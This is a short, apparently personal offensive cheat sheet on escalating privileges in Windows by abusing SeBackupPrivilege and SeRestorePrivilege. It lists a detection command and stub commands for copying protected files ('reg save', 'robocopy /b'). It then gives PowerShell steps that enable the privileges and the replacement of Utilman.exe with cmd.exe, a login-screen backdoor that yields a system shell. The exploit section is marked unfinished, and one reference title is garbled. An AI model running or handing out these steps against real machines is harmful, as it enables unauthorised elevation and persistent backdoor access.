# Living off the Land

## 01 - Detect

Look for `SeBackupPrivilege` and `SeRestorePrivilege` enabled in the current local username account.

```
C:\> whoami /priv
```

## 02 - Exploit

TODO: Fill this info

```
C:\> reg save

C:\> robocopy /b
```

```
PS C:\> .\Set-TokenPrivilege.ps1 -privilege SeBackupPrivilege <pid>
```

```
PS C:\> Import-Module .\EnableSeRestorePrivilege.ps1

PS C:\> Enable-SeRestorePrivilege
```


```
PS C:\> copy C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.bkp

PS C:\> copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```

---
## References

- [gtworek: EnableSeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)

- [Kojirohâ€™s technical weblog: How to Enable SeBackupPrivilege and seRestorePrivilege](https://kojiroh.wordpress.com/2020/12/15/how-to-enable-sebackupprivilege-and-serestoreprivilege/)

- [Lee Holmes: Adjusting Token Privileges in PowerShell](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)